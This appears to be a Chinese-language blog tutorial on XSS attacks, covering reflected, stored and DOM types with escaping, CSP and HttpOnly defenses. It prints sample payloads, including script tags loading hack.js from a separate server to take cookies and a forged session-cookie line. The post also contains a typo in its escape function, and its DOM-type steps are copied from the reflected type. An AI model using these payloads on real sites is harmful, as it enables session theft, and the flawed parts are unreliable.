---
title: 安全01:XSS攻击
sidebar: 'auto'
date: 2021-11-06
categories:
- 11前端安全
isShowComments: true
---






# 什么是XSS攻击

Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行，从而获取用户的敏感信息如 Cookie、SessionID 等

# XSS攻击分类

## 反射型

### 攻击

1.   黑客构造出包含脚本的URL
2.   用户点击URL时，网站服务器就会将脚本从URL中取出，拼接在HTML中返回给浏览器
3.   用户浏览器接受到响应后解析执行，脚本也被执行
4.   脚本就可以窃取用户的数据，发送给黑客的服务器

![截图](https://gitee.com/ljcdzh/my_pic/raw/master/img/202111060819994.png)

### 实例

```js
// 普通
http://localhost:3000/?from=china

// alert尝试
http://localhost:3000/?from=<script>alert(3)</script>

// 获取Cookie
http://localhost:3000/?from=<script src="http://localhost:4000/hack.js">
</script>

// 短域名伪造 https://dwz.cn/

// 伪造cookie入侵 chrome
document.cookie="kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUzNT
Y1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="
```

### 防范

#### 转义字符

##### 1. 转义用户输入的内容(replace)

```js
function escape(str) {
  str = str.replace(/&/g, '&amp;')
  str = str.replace(/</g, '&lt;')
  str = str.replace(/>/g, '&gt;')
  str = str.replace(/"/g, '&quto;')
  str = str.replace(/'/g, '&#39;')
  str = str.replace(/`/g, '&#96;')
  str = str.replace(/\//g, '&#x2F;')
  return str
}
```

##### 2. 利用浏览器特性：自动处理特殊字符(innerHTML)

```js
function filterStr(str) {
    const div = document.createElement('div')
    div.textContent = str
    return div.innerHTML
}
filterStr('<div></div>') // &lt;div&gt;&lt;/div&gt;
```

#### CSP

CSP: 本质上就是建立白名单，明确告诉浏览器哪些外部资源可以加载和执行。

使用方式：

1.   设置HTTP Header的Content-Security-Policy

![img](https://gitee.com/ljcdzh/my_pic/raw/master/img/202111060858557.jpeg)

```js
Content-Security-Policy: script-src 'self'; object-src 'none';
style-src cdn.example.org third-party.org; child-src https:
```

2.   meta标签

```js
<meta 
http-equiv="Content-Security-Policy" content="script-src 'self'; 
object-src 'none'; style-src cdn.example.org third-party.org; child-src https:">
```

上面代码中，CSP做了如下 配置：

-   脚本：只信任当前域名
-   `<object>`标签：不信任任何URL，即不加载任何资源
-   样式表：只信任`cdn.example.org`和`third-party.org`
-   框架（frame）：必须使用HTTPS协议加载
-   其他资源：没有限制

#### 防止脚本读取Cookie

1.   Cookie添加HttpOnly属性，防止脚本读取网站的cookie
2.   Cookie添加Secure属性，只能https协议才能传输cookie, 防止中间人截取传输的cookie

## 存储型

### 攻击步骤

1.   黑客通过论坛发帖、商品评论等途径，将脚本提交到目标网站的数据库中
2.   用户打开网站时，网站服务器将脚本从数据库中取出，拼接在HTML中返回给浏览器
3.   用户浏览器接受响应后解析执行，脚本也被执行
4.   脚本就可以窃取用户数据发送给黑客网站

![截图](https://gitee.com/ljcdzh/my_pic/raw/master/img/202111060906009.png)

### 攻击实例

```js
// 评论
<script>alert(1)</script>

// 跨站脚本注入
我来了<script src="http://localhost:4000/hack.js"></script>
```

## DOM型

### 攻击步骤

1.   黑客构造出包含脚本的URL
2.   用户点击URL时，网站服务器就会将脚本从URL中取出，拼接在HTML中返回给浏览器
3.   用户浏览器接受到响应后解析执行，脚本也被执行
4.   脚本就可以窃取用户的数据，发送给黑客的服务器

### 与其他XSS区别

DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。

### 实例

例如，黑客构造带有恶意代码的 URL 诱导用户打开 http://www.xxx.com/index.html/?content=，浏览器收到请求后解析之行，如果使用 document.write() 、document.outerHTML 、 .innerHTML未经转义输出，就可能遭到攻击。

![2图](https://gitee.com/ljcdzh/my_pic/raw/master/img/202111060916056.png)



# 参考

1.   [前端安全系列（一）：如何防止XSS攻击？](https://juejin.cn/post/6844903685122703367#heading-6)
2.   [浏览器专题系列 - Web安全](https://juejin.cn/post/6926726800793927693)
3.   [Web 安全 - 跨站脚本攻击 XSS 三种类型及防御措施](https://mp.weixin.qq.com/s/7ruF1I94p4Ve3tVDb6096A)
4.   [Content Security Policy 入门教程](http://www.ruanyifeng.com/blog/2016/09/csp.html)





